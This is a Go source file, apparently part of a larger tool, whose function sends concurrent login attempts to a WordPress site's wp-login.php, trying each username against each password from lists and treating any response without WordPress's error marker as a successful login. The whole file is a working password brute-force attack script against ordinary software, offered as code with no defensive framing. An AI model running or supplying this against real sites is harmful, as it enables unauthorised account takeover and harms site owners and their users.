package main

import (
	"net/http"
	"io/ioutil"
	"bytes"
	"net/url"
	"net/http/cookiejar"
	"strings"
	"fmt"
)

/***
 *    ______                           _
 *    | ___ \                         | |
 *    | |_/ /___  __ _ _   _  ___  ___| |_
 *    |    // _ \/ _` | | | |/ _ \/ __| __|
 *    | |\ \  __/ (_| | |_| |  __/\__ \ |_
 *    \_| \_\___|\__, |\__,_|\___||___/\__|
 *                  | |
 *                  |_|
 */

func request(start, end int) {
	defer wg.Done()
	for x := start; x < end; x++ {
		for y := x; y < end; y++ {
			fmt.Println("[", start, "-", end, "]", x, y)
			cookieJar, _ := cookiejar.New(nil)
			var cookies []*http.Cookie
			cookies = append(cookies, &http.Cookie{
				Name:   "wordpress_test_cookie",
				Value:  "WP+Cookie+check",
				Path:   "/",
				Domain: strings.Replace(location, "http://", "", 1),
			})
			cookieURL, _ := url.Parse(location + "/wp-login.php")
			cookieJar.SetCookies(cookieURL, cookies)
			req, err := http.NewRequest("POST", location + "/wp-login.php", bytes.NewBuffer([]byte("log=" + usr[x] + "&pwd=" + pwd[y] + "&wp-submit=Log In&redirect_to=" + location + "/wp-admin/&testcookie=1")))
			check_err(err)
			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

			client := &http.Client{
				Jar:cookieJar,
			}

			resp, err := client.Do(req)
			check_err(err)

			body, err := ioutil.ReadAll(resp.Body)
			check_err(err)
			resp.Body.Close()

			if strings.Contains(string(body), "<strong>ERROR</strong>") {
				fmt.Println("Wrong Username / Password")
			} else {
				panic(string(body))
			}
		}
	}
}